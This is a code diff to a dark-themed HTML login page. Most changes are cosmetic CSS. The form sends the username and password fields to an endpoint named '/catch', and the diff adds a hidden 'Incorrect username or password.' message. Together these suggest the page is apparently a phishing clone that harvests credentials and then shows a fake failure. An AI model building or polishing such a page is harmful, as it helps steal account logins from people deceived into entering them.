@@ -8,7 +8,7 @@
         body {
             background-color: #191b1d;
             color: #ffffff;
-            font-family: 'Haptik', 'Segoe UI', Arial, sans-serif;
+            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -24,12 +24,12 @@
             max-width: 400px;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
             text-align: center;
+            box-sizing: border-box;
         }
 
         h1 {
             font-size: 28px;
             margin-bottom: 25px;
-            font-weight: 700;
         }
 
         form {
@@ -49,9 +49,11 @@
             box-sizing: border-box;
         }
 
-        .input-control:focus {
-            border-color: #ffffff;
-            outline: none;
+        .error-message {
+            color: #f85149;
+            font-size: 13px;
+            display: none; /* Скрыто по умолчанию */
+            text-align: left;
         }
 
         .btn-submit {
@@ -65,11 +67,6 @@
             font-weight: bold;
             cursor: pointer;
             margin-top: 10px;
-            transition: background 0.2s;
-        }
-
-        .btn-submit:hover {
-            background-color: #cccccc;
         }
 
         .link-text {
@@ -78,10 +75,6 @@
             color: #b8b8b8;
             font-size: 13px;
             text-decoration: none;
-        }
-
-        .link-text:hover {
-            text-decoration: underline;
         }
 
         .secondary-actions {
@@ -99,11 +92,6 @@
             border: 1px solid #393b3d;
             border-radius: 4px;
             cursor: pointer;
-            font-size: 14px;
-        }
-
-        .btn-secondary:hover {
-            background-color: #2a2c2e;
         }
 
         .signup-text {
@@ -131,6 +119,7 @@
         <form action="/catch" method="POST">
             <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
             <input type="password" name="password" class="input-control" placeholder="Password" required>
+            <div class="error-message">Incorrect username or password.</div>
             <button type="submit" class="btn-submit">Log In</button>
         </form>
 
